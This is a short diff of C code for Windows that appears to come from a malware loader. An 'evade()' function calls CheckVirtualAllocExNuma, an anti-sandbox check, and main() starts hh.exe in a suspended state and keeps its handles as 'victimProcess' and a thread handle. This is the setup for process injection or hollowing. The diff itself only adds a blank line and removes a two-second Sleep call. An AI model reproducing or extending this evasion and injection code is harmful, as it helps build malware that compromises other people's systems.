@@ -122,6 +122,7 @@ void evade() {
     }
 
     CheckVirtualAllocExNuma();
+
 };
 
 int main() {
@@ -137,7 +138,6 @@ int main() {
     PROCESS_INFORMATION pi = { 0 };
 
     CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-	Sleep(2000);
 
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
